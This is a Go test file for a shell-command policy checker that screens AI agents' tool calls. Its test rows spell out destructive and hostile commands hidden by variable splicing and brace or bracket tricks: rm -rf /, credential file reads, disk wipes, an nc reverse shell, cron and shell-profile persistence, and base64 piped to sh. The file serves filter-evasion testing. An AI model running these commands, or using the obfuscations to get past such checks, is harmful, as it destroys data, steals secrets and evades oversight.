// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package policy

import (
	"path/filepath"
	"slices"
	"testing"

	"github.com/luckyPipewrench/pipelock/internal/config"
)

const (
	ruleSensitiveFileRead = "Credential File Access"
	ruleProfileWrite      = "Shell Profile Write via Command"
	ruleCron              = "Cron Job Persistence"
)

// wordReadingRows are commands whose destructive spelling appears only once
// an expansion the text decides is read: an unset parameter spliced into a
// word, a default-value expansion, an in-word brace expansion or a bracket
// expression listing literal characters.
var wordReadingRows = []struct {
	name, cmd, rule string
}{
	{"splice in program name", "r${u}m -rf /", ruleFileDelete},
	{"bare splice after program name", "rm$u -rf /", ruleFileDelete},
	{"positional splice", "r$1m -rf /", ruleFileDelete},
	{"default value names program", "${x:-rm} -rf /", ruleFileDelete},
	{"default value without colon", "${x-rm} -rf /", ruleFileDelete},
	{"assign default names program", "${x:=rm} -rf /", ruleFileDelete},
	{"nested default", "${x:-${y:-rm}} -rf /", ruleFileDelete},
	{"length expansion is not a splice", "r${#x}m -rf /tmp/x", ""},
	{"brace preamble", "{r,}m -rf /", ruleFileDelete},
	{"brace postscript", "r{m,} -rf /", ruleFileDelete},
	{"bracket in program name", "/bin/r[m] -rf /", ruleFileDelete},
	{"splice in credential path", "cat ~/.aws/cred${u}entials", ruleSensitiveFileRead},
	{"splice in credential directory", "cat ~/.a${u}ws/credentials", ruleSensitiveFileRead},
	{"splice in long option", "git push --for${u}ce", ruleGit},
	{"splice in reset option", "git reset --ha${u}rd", ruleGit},
	{"splice in chmod", "chm${u}od -R 777 /", rulePermissions},
	{"splice in short option", "chmod -${u}R 777 /", rulePermissions},
	{"splice in mode", "chmod -R 77${u}7 /", rulePermissions},
	{"splice in dd", "d${u}d if=/dev/zero of=/dev/sda", ruleDiskWipe},
	{"splice in mkfs", "mkfs.${u}ext4 /dev/sda", ruleDiskWipe},
	{"splice in nc", "n${u}c -e /bin/sh 10.0.0.1 4444", ruleRevShell},
	{"splice in crontab option", "crontab -${u}e", ruleCron},
	{"splice in crontab name", "echo x | cron${u}tab -", ruleCron},
	{"splice in profile name", "echo x >> ~/.b${u}ashrc", ruleProfileWrite},
	{"bracket in profile name", "echo x >> ~/.bas[h]rc", ruleProfileWrite},
	{"splice in base64", "ba${u}se64 -d <<< eA== | sh", ruleEncoded},
}

// wordReadingBenign are ordinary commands with expansions, globs and braces.
// The word reading must not make them match any default rule.
var wordReadingBenign = []string{
	"echo $HOME",
	"ls $DIR/*.go",
	"go test ./... -run $TEST_NAME",
	"git push origin $BRANCH",
	"rm $TMPFILE",
	"cat ${CONFIG_DIR}/app.yaml",
	"echo ${GREETING:-hello}",
	"cp {a,b}.txt /srv/out/",
	"grep [a]bc notes.txt",
	"make build PREFIX=${PREFIX:-/usr/local}",
	`echo \$u literal`,
}

func TestWordReading_DefaultRules(t *testing.T) {
	pc := New(config.MCPToolPolicy{Enabled: true, Action: config.ActionBlock, Rules: DefaultToolPolicyRules()})
	for _, tt := range wordReadingRows {
		t.Run(tt.name, func(t *testing.T) {
			v := pc.CheckToolCall("bash", []string{tt.cmd})
			if tt.rule == "" {
				if slices.Contains(v.Rules, ruleFileDelete) {
					t.Fatalf("%q matched %v; ${#x} is 0, not a splice", tt.cmd, v.Rules)
				}
				return
			}
			if !v.Matched || v.Action != config.ActionBlock || !slices.Contains(v.Rules, tt.rule) {
				t.Fatalf("%q: verdict %v %q %v, want %s with block", tt.cmd, v.Matched, v.Action, v.Rules, tt.rule)
			}
		})
	}
	for _, cmd := range wordReadingBenign {
		t.Run("benign/"+cmd, func(t *testing.T) {
			if v := pc.CheckToolCall("bash", []string{cmd}); v.Matched {
				t.Fatalf("%q matched %v (%s)", cmd, v.Rules, v.Action)
			}
		})
	}
}

// TestWordReading_Presets checks the rows under the shipped hostile-model and
// strict presets, which the reading must reach through the same views.
func TestWordReading_Presets(t *testing.T) {
	for _, name := range []string{"strict.yaml", "hostile-model.yaml"} {
		path, err := filepath.Abs(filepath.Join("..", "..", "..", "configs", name))
		if err != nil {
			t.Fatal(err)
		}
		cfg, err := config.Load(path)
		if err != nil {
			t.Fatalf("load %s: %v", name, err)
		}
		pc := New(cfg.MCPToolPolicy)
		for _, tt := range wordReadingRows {
			if tt.rule == "" {
				continue
			}
			t.Run(name+"/"+tt.name, func(t *testing.T) {
				v := pc.CheckToolCall("bash", []string{tt.cmd})
				if !v.Matched || v.Action != config.ActionBlock {
					t.Fatalf("%q: verdict %v %q %v, want block", tt.cmd, v.Matched, v.Action, v.Rules)
				}
			})
		}
	}
}

func TestReadUnsetParameters(t *testing.T) {
	tests := []struct{ in, want string }{
		{"r${u}m", "rm"},
		{"rm$u -rf", "rm -rf"},
		{"${x:-rm}", "rm"},
		{"${x-rm}", "rm"},
		{"${x:=rm}", "rm"},
		{"${x=rm}", "rm"},
		{"${x:+rm}", ""},
		{"${x+rm}", ""},
		{"${x:?rm}", ""},
		{"${#x}", "0"},
		{"${x%rm}", ""},
		{"${!x}", ""},
		{"${x:-${y:-rm}}", "rm"},
		{"${10}", ""},
		{"$1x", "x"},
		{"$IFS ${IFS} ${IFS:0:1}", "$IFS ${IFS} ${IFS:0:1}"},
		{`\$u ${u}`, `\$u `},
		{"$? $$ $0", "$? $$ $0"},
		{"no expansion", "no expansion"},
	}
	for _, tt := range tests {
		if got := readUnsetParameters(tt.in); got != tt.want {
			t.Errorf("readUnsetParameters(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

func TestExpandWords(t *testing.T) {
	tests := []struct{ in, want string }{
		{"{r,}m -rf", "rm m -rf"},
		{"{rm,-rf,/tmp}", "rm -rf /tmp"},
		{"/etc/{passwd,shadow}", "/etc/passwd /etc/shadow"},
		{"a{b,c}d{e,f}", "abde abdf acde acdf"},
		{"/bin/r[m]", "/bin/rm"},
		{"x[ab]y", "xay xby"},
		{"ls *.go [!a] [a-z]", "ls *.go [!a] [a-z]"},
		{"echo {a,b};r[m] x|{c,d}", "echo a b;rm x|c d"},
		{`{"k":1,"v":2}`, `{"k":1,"v":2}`},
	}
	for _, tt := range tests {
		if got := expandWords(tt.in); got != tt.want {
			t.Errorf("expandWords(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

// TestExpandWords_Bounded: a word whose expansion would exceed
// maxWordExpansions keeps its spelling instead of growing without bound.
func TestExpandWords_Bounded(t *testing.T) {
	word := "{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}"
	if got := expandWords(word); got != word {
		t.Fatalf("expandWords of a 128-word expansion = %d bytes, want the word unchanged", len(got))
	}
	small := "{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}"
	if got := expandWords(small); got == small {
		t.Fatal("a 64-word expansion was not expanded")
	}
}
